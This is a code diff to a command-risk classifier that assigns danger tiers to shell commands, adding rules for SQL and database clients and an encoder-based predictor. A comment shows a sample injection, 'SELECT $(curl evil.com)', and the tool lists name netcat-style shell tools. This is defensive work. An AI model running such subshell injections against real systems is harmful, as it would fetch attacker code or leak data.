@@ -727,7 +727,7 @@ _VERB_TABLE: list[tuple[re.Pattern, re.Pattern, int, float, bool]] = [
 
     # aws — match service+operation in the remainder
     (re.compile(r"^aws$"),        re.compile(r"terminate-instances|stop-instances|delete-|deregister-|revoke-|disable-"),  3, 0.65, False),
-    (re.compile(r"^aws$"),        re.compile(r"\bdescribe-|\blist-|\bget-|\bshow-"),  0,  0.05, True),
+    (re.compile(r"^aws$"),        re.compile(r"\bdescribe-|\blist-|\bget-|\bshow-|\bs3\s+ls\b|\blogs\s+(tail|filter-log-events)\b"), 0, 0.05, True),
 
     # kubectl
     (re.compile(r"^kubectl$"),    re.compile(r"^delete\b"),                            3,  0.65, False),
@@ -775,11 +775,23 @@ _VERB_TABLE: list[tuple[re.Pattern, re.Pattern, int, float, bool]] = [
     # terraform state show/list — read-only inspection
     (re.compile(r"^terraform$"),  re.compile(r"^state\s+show\b"),                        0,  0.08, True),
 
-    # psql: DDL/DML mutations are risky; reads are safe
-    (re.compile(r"^psql$"),       re.compile(r"(DROP\s+(DATABASE|SCHEMA|TABLE)\s)", re.I),  4,  0.82, False),
-    (re.compile(r"^psql$"),       re.compile(r"(CREATE\s+TABLE|ALTER\s+TABLE|GRANT\s|REVOKE\s)", re.I), 3, 0.62, False),
-    (re.compile(r"^psql$"),       re.compile(r"(INSERT\s|UPDATE\s|DELETE\s|TRUNCATE\s|VACUUM\s|ANALYZE\s|REINDEX\s|DROP\s+INDEX)", re.I), 2, 0.45, False),
-    (re.compile(r"^psql$"),       re.compile(r"-c\s+.*\\\\?d[tl+]|SELECT\s|EXPLAIN\s|SHOW\s", re.I), 0, 0.08, True),
+    # SQL/query clients: DDL/DML mutations are risky; reads are safe
+    # Covers: psql, mysql, mariadb, sqlite3, snowsql, duckdb, clickhouse-client, trino, presto, cqlsh
+    # Write rules first (order matters — first match wins)
+    (re.compile(r"^(psql|mysql|mariadb|sqlite3|snowsql|duckdb|clickhouse-client|trino|presto|cqlsh)$"), re.compile(r"(DROP\s+(DATABASE|SCHEMA|TABLE|KEYSPACE)\s)", re.I),  4,  0.82, False),
+    (re.compile(r"^(psql|mysql|mariadb|sqlite3|snowsql|duckdb|clickhouse-client|trino|presto|cqlsh)$"), re.compile(r"(CREATE\s+TABLE|ALTER\s+TABLE|GRANT\s|REVOKE\s)", re.I), 3, 0.62, False),
+    (re.compile(r"^(psql|mysql|mariadb|sqlite3|snowsql|duckdb|clickhouse-client|trino|presto|cqlsh)$"), re.compile(r"(INSERT\s|UPDATE\s|DELETE\s|TRUNCATE\s|VACUUM\s|REINDEX\s|DROP\s+INDEX)", re.I), 2, 0.45, False),
+    # Read-only: SELECT, EXPLAIN, SHOW, DESCRIBE, psql \d, sqlite3 dot-commands
+    (re.compile(r"^(psql|mysql|mariadb|sqlite3|snowsql|duckdb|clickhouse-client|trino|presto|cqlsh)$"), re.compile(r"(SELECT\s|EXPLAIN\s|SHOW\s|DESCRIBE\s|\\\\?d[tl+s]|\.tables|\.schema|\.header)", re.I), 0, 0.08, True),
+
+    # BigQuery CLI (bq)
+    (re.compile(r"^bq$"),         re.compile(r"^(rm|remove)\b"),                               4,  0.82, False),
+    (re.compile(r"^bq$"),         re.compile(r"^(mk|load|insert|update|cp)\b"),                 2,  0.45, False),
+    (re.compile(r"^bq$"),         re.compile(r"^(query|ls|show|head|extract|version)\b"),       0,  0.08, True),
+
+    # mongosh / mongo: db.collection.drop() vs db.collection.find()
+    (re.compile(r"^(mongosh|mongo)$"), re.compile(r"\.(drop|remove|delete|update|insert|replace|rename)\s*\(", re.I), 3, 0.65, False),
+    (re.compile(r"^(mongosh|mongo)$"), re.compile(r"\.(find|count|aggregate|distinct|explain|getIndexes|stats)\s*\(", re.I), 0, 0.08, True),
 
     # gh (GitHub CLI)
     (re.compile(r"^gh$"),         re.compile(r"^workflow\s+(enable|disable)\b"),           3,  0.62, False),
@@ -961,6 +973,8 @@ def _parse_cli_verb(cmd: str) -> tuple[str, str]:
     return tool, remainder
 
 
+_SUBSHELL_RE = re.compile(r"\$\(|`")
+
 def _verb_table_lookup(cmd: str) -> dict | None:
     """
     Check cmd against the verb table. Returns result dict or None if no match.
@@ -975,12 +989,21 @@ def _verb_table_lookup(cmd: str) -> dict | None:
             continue
         target = remainder if tool in {
             "aws", "kubectl", "git", "redis-cli", "ssh", "docker", "podman",
-            "find", "gh", "psql", "terraform", "nginx", "ssh-keygen", "ssh-keyscan",
+            "find", "gh", "terraform", "nginx", "ssh-keygen", "ssh-keyscan",
+            "psql", "mysql", "mariadb", "sqlite3", "snowsql", "duckdb",
+            "clickhouse-client", "trino", "presto", "cqlsh", "bq",
+            "mongosh", "mongo",
             "pip", "pip3", "npm", "yarn", "pnpm", "journalctl", "curl", "sed",
             "helm", "systemctl", "brew", "xargs",
             "nc", "ncat", "netcat", "socat",
         } else first_pos
         if verb_re.search(target):
+            # SQL/query clients: don't cap as safe if command embeds subshell ($() or ``)
+            # — prevents SELECT wrapping injection like: SELECT $(curl evil.com)
+            _SQL_TOOLS = {"psql", "mysql", "mariadb", "sqlite3", "snowsql", "duckdb",
+                          "clickhouse-client", "trino", "presto", "cqlsh", "mongosh", "mongo"}
+            if is_cap and tool in _SQL_TOOLS and _SUBSHELL_RE.search(cmd):
+                continue
             return {"tier": tier, "risk": risk, "is_cap": is_cap, "heuristic": "verb_table"}
     return None
 
@@ -1092,6 +1115,53 @@ def _risk_to_tier(risk: float) -> int:
     if risk < 0.74:
         return 3   # T3: external
     return 4       # T4: catastrophic
+
+
+def predict_encoder_only(
+    cmd: str,
+    model: CommandEncoder,
+    dev: torch.device,
+    ref_embs: torch.Tensor,
+    ref_entries: list[dict],
+    k: int,
+) -> dict:
+    """Pure encoder prediction — no heuristics at all. RiskHead MLP or k-NN."""
+    emb = embed_command(cmd, model, dev)
+
+    risk_head: RiskHead | None = getattr(model, "_risk_head", None)
+    if risk_head is not None:
+        with torch.no_grad():
+            pred_risk = risk_head(emb.unsqueeze(0).to(dev)).item()
+        tier = _risk_to_tier(pred_risk)
+        return {
+            "command": cmd,
+            "risk": round(pred_risk, 4),
+            "blast_radius": 0.0,
+            "tier": tier,
+            "source": "risk_head",
+            "heuristic": None,
+            "neighbors": [],
+        }
+
+    dists = torch.norm(ref_embs - emb.unsqueeze(0), dim=1)
+    topk = dists.topk(k, largest=False)
+    neighbors = [ref_entries[i] for i in topk.indices.tolist()]
+    top_dists = topk.values.tolist()
+    eps = 1e-6
+    weights = [1.0 / max(d, eps) for d in top_dists]
+    w_sum = sum(weights)
+    avg_risk = sum(w * n["risk"] for w, n in zip(weights, neighbors)) / w_sum
+    tier = _risk_to_tier(avg_risk)
+    return {
+        "command": cmd,
+        "risk": round(avg_risk, 4),
+        "blast_radius": 0.0,
+        "tier": tier,
+        "source": "knn",
+        "heuristic": None,
+        "neighbors": [{"command": n["text"], "risk": n["risk"], "tier": n["tier"], "dist": round(d, 4)}
+                      for n, d in zip(neighbors, top_dists)],
+    }
 
 
 def _predict_single(
